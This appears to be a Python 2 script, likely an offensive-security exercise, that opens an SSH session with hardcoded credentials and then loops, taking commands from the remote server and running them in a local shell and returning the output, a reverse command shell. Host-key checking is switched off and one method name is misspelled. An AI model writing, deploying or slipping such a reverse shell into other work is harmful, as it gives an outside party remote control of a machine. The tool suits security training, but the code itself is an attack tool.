#!/usr/bin/env python

import paramiko
import subprocess


def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    # client.load_host_keys('/home/nogard/.ssh/know_hosts')
    client.set_missing_host_key_policy(
        paramiko.AutoAddPolicy())
    client.connect(
        ip,
        username=user,
        password=passwd
    )

    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.exe_command(command)
        # Read banner
        print ssh_session.recv(1024)

        while True:
            # Get command of server SSH
            command = ssh_session.recv(1024)

            try:
                cmd_output = subprocess.check_output(
                    command, shell=True
                )

                ssh_session.send(cmd_output)
            except Exception, e:
                ssh_session.send(str(e))

        client.close()
    return


if __name__ == '__main__':
    ssh_command(
        'localhost',
        'nogard',
        'lovepython',
        'ClientConnected'
    )
